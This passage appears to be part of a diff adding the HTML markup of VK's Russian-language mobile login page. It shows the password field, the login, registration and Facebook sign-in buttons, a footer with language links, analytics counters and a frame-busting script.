+<label class="TextInput PasswordInput" role="presentational"><div class="TextInput__content"><div class="TextInput__nativeWrap"><input autocomplete="current-password" class="TextInput__native" name="pass" onblur="TextInput.onBlur(event, this);" onfocus="TextInput.onFocus(event, this);" oninput="TextInput.onChange(event);" placeholder="Пароль" spellcheck="" type="password" value=""/></div><div class="TextInput__postfix"><button aria-expanded="false" class="PasswordInput__button" onclick="PasswordInput.toggleVisibility(event, this, true)" type="button"><div aria-hidden="true" class="svgIcon svgIcon-view_outline_24"><svg height="24" viewbox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg"><g fill="none" fill-rule="evenodd"><path d="m0 0h24v24h-24z"></path><path d="m12 4.6c5.1997172 0 10.4 4.23726743 10.4 7.4 0 3.1627326-5.2002828 7.4-10.4 7.4-5.19971725 0-10.4-4.2372674-10.4-7.4 0-3.16273257 5.20028275-7.4 10.4-7.4zm0 1.8c-4.27755548 0-8.6 3.52199183-8.6 5.6 0 2.0780082 4.32244452 5.6 8.6 5.6 4.2775555 0 8.6-3.5219918 8.6-5.6 0-2.07800817-4.3224445-5.6-8.6-5.6zm0 2.2c1.8777681 0 3.4 1.5222319 3.4 3.4s-1.5222319 3.4-3.4 3.4-3.4-1.5222319-3.4-3.4 1.5222319-3.4 3.4-3.4zm0 1.8c-.8836556 0-1.6.7163444-1.6 1.6s.7163444 1.6 1.6 1.6 1.6-.7163444 1.6-1.6-.7163444-1.6-1.6-1.6z" fill="currentColor" fill-rule="nonzero"></path></g></svg></div></button></div></div></label>
+</dd>
+</dl>
+<div class="fi_row_new">
+<input class="button wide_button" type="submit" value="Войти"/>
+</div>
+<div class="fi_row">
+<div class="near_btn wide_button login_restore"><a href="https://static.vk.com/restore" rel="noopener">Забыли пароль?</a></div>
+</div>
+<div class="login_new_user">
+<div class="fi_header fi_header_light">Впервые ВКонтакте?</div>
+</div>
+<div class="fi_row">
+<a class="button wide_button success" href="/join?to=bWFpbD9hY3Q9c2hvdyZjaGF0PTE0Nw--" rel="noopener">Зарегистрироваться</a>
+</div>
+<div class="socials">
+<a class="social_button" href="/login?act=fb_sign&amp;to=bWFpbD9hY3Q9c2hvdyZjaGF0PTE0Nw--"><i class="social_icon"></i>Войти через Facebook</a>
+</div>
+</form>
+</div>
+</div>
+</div></div><div class="screen_feed"></div></div>
+<div class="basis__footer mfoot" id="mfoot"><div class="pfoot">
+<ul class="footer_menu">
+<li class="fm_row"><a class="fm_item" href="/settings?act=change_regional&amp;hash=8c548d32bdbe0e33d8&amp;to=bWFpbD9hY3Q9c2hvdyZjaGF0PTE0Nw--&amp;lang_id=1">Українська</a></li><li class="fm_row"><a class="fm_item" href="/settings?act=change_regional&amp;hash=8c548d32bdbe0e33d8&amp;to=bWFpbD9hY3Q9c2hvdyZjaGF0PTE0Nw--&amp;lang_id=3">English</a></li>
+<li class="fm_row"><a class="fm_item" href="/settings?act=select_lang&amp;to=bWFpbD9hY3Q9c2hvdyZjaGF0PTE0Nw--">all languages »</a></li>
+</ul>
+<ul class="footer_menu" id="footer_menu">
+<li class="fm_row"><a class="fm_item" href="/fv?to=%2F%3F_fm%3D1%26_fm2%3D1">Версия для компьютера</a></li>
+</ul>
+</div></div>
+<div aria-hidden="true" class="_cntrs" style="height:0;overflow:hidden;">
+<img alt="" height="1" src="https://sb.scorecardresearch.com/p?c1=2&amp;c2=13765216&amp;c3=&amp;c4=https%3A%2F%2Fm.vk.com%2Flogin%3Frole%3Dfast%26to%3DbWFpbD9hY3Q9c2hvdyZjaGF0PTE0Nw--%26s%3D0&amp;c5=&amp;c9=&amp;c15=&amp;cv=2.0&amp;cj=1&amp;rn=98360720" width="1"/>
+<noscript><img height="1" src="//top-fwz1.mail.ru/counter?id=2579437;pid=0;r=" style="border:0;" width="1"/></noscript>
+</div>
+</div>
+</div>
+</div>
+</div>
+<script type="text/javascript">
+<!--
+parent&&parent!=window&&(document.getElementsByTagName('body')[0].innerHTML='');try{sessionStorage.set('is_mvk_tab', 1)}catch(e){};window.store.stickers = {"url_template":"https:\/\/vk.com\/sticker\/1-%id%-%size%"};;(function (d, w) {
+var ts = d.createElement("script"); ts.type = "text/javascript"; ts.async = true;
+ts.src = (d.location.protocol == "https:" ? "https:" : "http:") + "//top-fwz1.mail.ru/js/code.js";
+var f = function () {var s = d.getElementsByTagName("script")[0]; s.parentNode.insertBefore(ts, s);};
+if (w.opera == "[object Opera]") { d.addEventListener("DOMContentLoaded", f, false); } else { f(); }
+})(document, window);
+//-->
+</script>
+<div id="vk_utils"></div>
+<div id="z"></div>
+<div id="vk_bottom"></div>
+<div id="theme_color_shim"></div>
+</body>
+</html>
